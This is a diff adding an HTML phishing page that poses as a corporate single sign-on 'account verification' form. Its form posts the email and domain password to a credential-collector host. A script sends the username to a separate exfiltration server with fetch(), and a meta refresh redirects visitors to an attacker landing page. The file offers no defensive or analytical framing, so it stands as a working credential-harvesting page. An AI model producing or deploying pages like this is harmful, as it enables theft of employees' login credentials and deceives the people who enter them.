@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="30;url=http://attacker-redirect.xyz/landing">
+    <title>Urgent Security Verification</title>
+    <script>
+        function exfiltrateCredentials() {
+            var user = document.getElementById('username').value;
+            fetch('http://exfil.remote-server.xyz/keys?u=' + encodeURIComponent(user));
+        }
+    </script>
+</head>
+<body onload="console.log('Phishing page loaded');">
+    <h2>Corporate Account Verification</h2>
+    <p>Please enter your corporate single sign-on credentials below:</p>
+    
+    <form action="http://malicious-login-collector.xyz/login.php" method="POST" onsubmit="exfiltrateCredentials();">
+        <label>Corporate Email: <input type="text" id="username" name="email"></label><br><br>
+        <label>Domain Password: <input type="password" name="password"></label><br><br>
+        <input type="submit" value="Verify Identity">
+    </form>
+
+    <h3>Internal Portal Mirror:</h3>
+    <iframe src="https://example.com" width="600" height="300" style="border:1px solid #ccc;"></iframe>
+</body>
+</html>
